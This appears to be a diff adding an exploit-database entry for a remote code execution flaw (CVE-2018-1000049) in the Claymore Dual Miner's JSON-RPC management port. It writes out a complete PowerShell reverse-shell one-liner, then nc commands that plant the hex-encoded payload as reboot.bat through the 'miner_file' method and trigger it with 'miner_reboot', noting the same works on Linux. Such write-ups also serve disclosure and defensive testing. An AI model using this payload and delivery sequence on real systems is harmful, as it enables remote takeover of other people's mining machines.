@@ -1,0 +1,25 @@
+# Exploit Title: Nanopool Claymore Dual Miner >= 7.3 Remote Code Execution
+# Date: 2018/02/09
+# Exploit Author: ReverseBrain
+# Vendor Homepage: https://nanopool.org/
+# Software Link: https://github.com/nanopool/Claymore-Dual-Miner
+# Version: 7.3 and later
+# Tested on: Windows, Linux
+# CVE : 2018-1000049
+
+Suppose the miner is running on localhost on port 3333. First of all you need to convert a .bat string into hexadecimal format, for example, this one uses powershell to spawn a reverse shell on localhost listening on port 1234:
+
+powershell.exe -Command "$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+Convert it into hexadecimal and paste it on the second parameter inside this string:
+
+echo '{"id":0,"jsonrpc":"2.0","method":"miner_file","params":["reboot.bat","HEX_STRING"]}' | nc 127.0.0.1 3333 -v
+
+Then, to trigger the vulnerability just send {"id":0,"jsonrpc":"2.0","method":"miner_reboot"}
+string to the miner.
+
+echo '{"id":0,"jsonrpc":"2.0","method":"miner_reboot"}' | nc 127.0.0.1 3333 -v
+
+You got the shell!
+
+This exploit works also on Linux, just substitute reboot.bat with reboot.bash or reboot.sh.
